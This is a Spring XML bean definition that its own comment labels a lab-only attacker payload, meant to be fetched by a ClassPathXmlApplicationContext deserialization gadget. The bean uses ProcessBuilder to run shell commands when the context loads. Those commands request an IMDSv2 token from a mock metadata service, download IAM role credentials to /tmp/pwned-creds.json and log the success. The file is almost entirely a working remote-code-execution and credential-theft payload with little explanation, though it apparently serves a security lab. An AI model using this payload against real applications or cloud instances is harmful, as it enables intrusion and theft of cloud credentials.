<!--
  LAB-ONLY "attacker" Spring bean definition.

  This is the payload that a real attacker's ClassPathXmlApplicationContext
  gadget would fetch and parse. Spring eagerly instantiates every
  non-lazy bean when the context loads, which is what makes this a code
  execution primitive rather than inert config.
-->
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>/bin/sh</value>
                <value>-c</value>
                <value>
                    TOKEN=$(wget -q -O- --method=PUT --header="X-aws-ec2-metadata-token-ttl-seconds: 21600" http://metadata-mock:1338/latest/api/token);
                    wget -q -O /tmp/pwned-creds.json --header="X-aws-ec2-metadata-token: $TOKEN" http://metadata-mock:1338/latest/meta-data/iam/security-credentials/lab-instance-role;
                    echo "[gadget] wrote /tmp/pwned-creds.json inside vuln-app container" >> /tmp/pwned.log
                </value>
            </list>
        </constructor-arg>
    </bean>

</beans>
